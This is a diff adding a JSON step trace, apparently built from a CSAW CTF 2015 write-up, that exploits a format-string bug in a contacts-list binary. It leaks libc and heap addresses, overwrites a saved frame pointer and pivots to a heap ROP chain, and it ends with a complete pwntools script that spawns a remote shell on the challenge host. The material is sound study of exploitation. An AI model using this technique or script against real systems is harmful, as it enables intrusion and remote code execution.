@@ -1,0 +1,58 @@
+[
+    {
+        "type": "thought",
+        "content": "We are given a 32-bit ELF binary which, when run, allows us to create, remove, edit and display entries in a contact list:"
+    },
+    {
+        "type": "execution",
+        "content": "./contacts "
+    },
+    {
+        "type": "thought",
+        "content": "Let's take a look at the security features of the binary:"
+    },
+    {
+        "type": "execution",
+        "content": "checksec.sh --file contacts "
+    },
+    {
+        "type": "thought",
+        "content": "We load it up in radare2 and do some reverse-engineering to get an idea of its functionality. The vulnerability is located in the contact entry display function at 0x08048BD1 (renamed show_contacts by us):"
+    },
+    {
+        "type": "execution",
+        "content": "r2 -A contacts"
+    },
+    {
+        "type": "thought",
+        "content": "The final printf call uses user-controlled data as its format parameter leading to a format string vulnerability. We can see we have control over the contents of description. Where contact_list is a variable located at 0x0804B0A0 in the .bss segment. As we can see in the function that adds a description to a contact (called by create_contact) the contact description is located on the heap. Given that this is an arbitrary-control format string vulnerability we can use it for both infoleaking and exploitation purposes. Loading the binary in gdb, getting the base address of libc (which will be ASLR-randomized) and subsequently comparing the information leaked by the infoleak shows us that we can (using direct format string parameter access) leak a pointer to our own description string on the heap as well as a return-address pointer into libc."
+    },
+    {
+        "type": "execution",
+        "content": "gdb ./contacts"
+    },
+    {
+        "type": "thought",
+        "content": "This infoleak is important because since we are dealing with both NX and ASLR protections we will need to construct a ROP chain and bypass ASLR. The ingredients for our ROP chain are as follows:\n\naddress of system() in libc\naddress of a \"/bin/sh\" string\na bogus return address (0xBADC0DE) for the ROP-call of system()\nIf we can hijack EIP control so that it ends up pointing to system() while the stack pointer points to our ROP chain (composed of a bogus return address and the address of \"/bin/sh\") then we can pop a shell on the target machine.\n\nBut let's first try to find out what remote libc version is used. We will have to make some assumptions but it helps that we can leak our __libc_start_main return address point, let's leak it remotely. Using Niklas Baumstark's libc-database tool we get a list of candidate libc versions based on the leaked pointer:"
+    },
+    {
+        "type": "execution",
+        "content": "./find __libc_start_main_ret a63 && ./dump libc6-i386_2.19-0ubuntu6.6_amd64"
+    },
+    {
+        "type": "thought",
+        "content": "We simply settle for the first candidate libc version and if this proves to be incorrect we can try the others (hoping the libc version is among them). This gives us offsets:\n\noffset___libc_start_main_ret = 0x19a63\noffset_system = 0x0003fcd0\noffset_str_bin_sh = 0x15da84\nWhich we can use to construct our ROP chain later on.\nSo let's first try to achieve EIP control. Given that it's a format string vulnerability we can use it as a write-anything-somewhere primitive where we can write a arbitrary 2-byte or 4-byte sequences to address positioned on the stack. This scenario is a little different from the usual one though since our format-string is not on the stack (but in the .bss segment) and as such we cannot use our own string to specify an arbitrary address to write to so we're stuck with what we have available to us on the stack.\n\nUsing the format string as infoleak we can see an interesting target address however:"
+    },
+    {
+        "type": "execution",
+        "content": "./contacts < 1\\r\\n1337\\r\\n100\\r\\n%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.\\r\\n4\\r\\n"
+    },
+    {
+        "type": "thought",
+        "content": "Here we can see the 6th DWORD on the stack precedes address 0x8048c99. Given that 0x8048c99 is the return address for the show_contact function back into the display_contacts function this indicates 0xbffff488 is the saved frame pointer of that function. If we write to that address we will overwrite the saved frame pointer of the stack frame preceding it (which corresponds to the main routine) and upon returning from that routine the following function epilogue will be executed:\n\nleave\nretn\nWhich is equivalent to:\n\nmov esp, (old_ebp+4)\npop eip\nSo if we overwrite the saved framepointer located at 0xbffff488 with a value (minus 4) we have arbitrary control over EIP and we also have control over ESP. We can use this to make EIP point to the first DWORD in our ROP chain (ie. the address of system) and have ESP point to the second DWORD in the ROP chain (due to retn being the equivalent of a pop eip).\n\nGiven that we cannot control the actual stack we have to position our ROP chain somewhere where we can make it (and the surrounding memory area) act like a 'fake stack', including having enough 'scratch space' for the instructions and function calls in our ROP chain to work with without reading from or writing to invalid memory addresses. Luckily our contact description is allocated on the heap and we have control over the (arbitrary) allocation size. So allocating a heap buffer of 8192 bytes and placing our ROP chain there will allow it to act like a 'fake stack'.\n\nHence using the %Ax%Bx%6$n template (where A and B are numbers dependent on our ROP chain address) we can exploit this vulnerability.\nAll that's left is using the infoleak a second time during ROP chain positioning to disclose a pointer to its heap buffer which we will then use as the target address to overwrite the saved frame pointer at 0xbffff488 with our ROP chain address."
+    },
+    {
+        "type": "execution",
+        "content": "#!/usr/bin/env python\n#\n# CSAWCTF 2015\n#\n# @a: Smoke Leet Everyday\n# @u: https://github.com/smokeleeteveryday\n#\n\nimport re\nfrom pwn import *\nfrom struct import pack\nfrom math import floor\n\ndef do_infoleak(h, pointer_offset): \n  name = \"infoleak\"\n  phone = \"1337\"\n  desc_len = \"8192\"\n  desc = \"%31$x\"\n\n  # Create new contact\n  h.sendline(\"1\")\n\n  msg = h.recvuntil('Name: ')\n  print msg\n\n  h.sendline(name)\n\n  msg = h.recvuntil('Enter Phone No: ')\n  print msg\n\n  h.sendline(phone)\n\n  msg = h.recvuntil('Length of description: ')\n  print msg\n\n  h.sendline(desc_len)\n\n  msg = h.recv(1024)\n  print msg\n\n  h.sendline(desc)\n\n  msg = h.recvuntil('>>> ')\n  print msg\n\n  # Display contacts\n  h.sendline(\"4\")\n\n  msg = h.recvuntil('>>> ')\n  print msg\n\n  # Extract leaked pointers\n  libc_ptr = re.findall('.*Description:\\s(.*?)\\n.*', msg)[0]\n  return (int(libc_ptr, 16) - pointer_offset)\n\ndef set_ropchain(h, system_addr, binsh_addr): \n  name = \"ropchain\"\n  phone = \"1337\"\n  # Need enough space on heap since it's going to be treated as stack during ROP sploiting\n  desc_len = \"8192\"\n\n  # junk return address for system\n  junk = 0x0BADC0DE\n\n  # ROP chain: [@system (4 bytes)][junk (4 bytes)][@\"/bin/sh\" (4 bytes)]\n  ROP_chain = [system_addr,\n         junk,\n               binsh_addr]\n  # Include FMS infoleak to get address of ROP chain\n  desc = \"\".join([pack('<I', x) for x in ROP_chain]) + \"<%11$x>\"\n\n  # Create new contact\n  h.sendline(\"1\")\n\n  msg = h.recvuntil('Name: ')\n  print msg\n\n  h.sendline(name)\n\n  msg = h.recvuntil('Enter Phone No: ')\n  print msg\n\n  h.sendline(phone)\n\n  msg = h.recvuntil('Length of description: ')\n  print msg\n\n  h.sendline(desc_len)\n\n  msg = h.recv(1024)\n  print msg\n\n  h.sendline(desc)\n\n  msg = h.recvuntil('>>> ')\n  print msg\n\n  # Display contacts\n  h.sendline(\"4\")\n\n  msg = h.recvuntil('>>> ')\n  print msg\n\n  return int(re.findall('.*Description:.*?\\<(.*?)\\>.*\\n.*', msg)[0], 16)\n\ndef do_exploit(h, ropchain_addr):\n  name = \"sploit\"\n  phone = \"1\"\n  desc_len = \"900\"\n\n  new_ebp = (ropchain_addr - 4)\n\n  part_1 = floor(new_ebp / 2)\n  part_2 = part_1 + (new_ebp - (part_1 * 2))\n\n  # Format string exploit: overwrite saved EBP with (ropchain_addr - 4)\n  desc_buffer = \"%\"+str(part_1)+\"x%\"+str(part_2)+\"x%6$n\"\n\n  print \"[*]Sending exploit...\"\n\n  # Create new contact\n  h.sendline(\"1\")\n\n  msg = h.recvuntil('Name: ')\n  print msg\n\n  h.sendline(name)\n\n  msg = h.recvuntil('Enter Phone No: ')\n  print msg\n\n  h.sendline(phone)\n\n  msg = h.recvuntil('Length of description: ')\n  print msg\n\n  h.sendline(desc_len)\n\n  msg = h.recv(1024)\n  print msg\n\n  h.sendline(desc_buffer)\n\n  msg = h.recvuntil('>>> ')\n  print msg\n\n  print \"[+]Exploit sent!\"\n\n  # Trigger exploit\n  print \"[*]Triggering format string vulnerability...\"\n\n  # Display contacts\n  h.sendline(\"4\")\n\n  # Receive printed output until we are back at menu\n  msg = h.recvuntil('>>> ')\n\n  print \"[*]Triggering RCE condition...\"\n  # Exit\n  h.sendline(\"5\")\n\n  # Waiting for the shell to pop!\n  h.interactive()\n\n  return\n\nhost = '54.165.223.128'\nport = 2555\n\noffset_libc_start_main_ret = 0x19a63\noffset_system = 0x0003fcd0\noffset_str_bin_sh = 0x15da84\n\nh = remote(host, port, timeout = None)\n\nmsg = h.recvuntil('>>> ')\n\nprint msg\n\n# Use infoleak\nlibc_base = do_infoleak(h, offset_libc_start_main_ret)\nsystem_addr = (libc_base + offset_system)\nbinsh_addr = (libc_base + offset_str_bin_sh)\n\nprint \"[+]Got leaked libc base address: [0x%x]\" % libc_base\nprint \"[+]Got '/bin/sh' address: [0x%x]\" % binsh_addr\nprint \"[+]Got system() address: [0x%x]\" % system_addr\n\n# Build ROP chain\nropchain_addr = set_ropchain(h, system_addr, binsh_addr)\n\nprint \"[+]Got ROP chain address: [0x%x]\" % ropchain_addr\n\ndo_exploit(h, ropchain_addr)\n\nh.close()"
+    }
+]
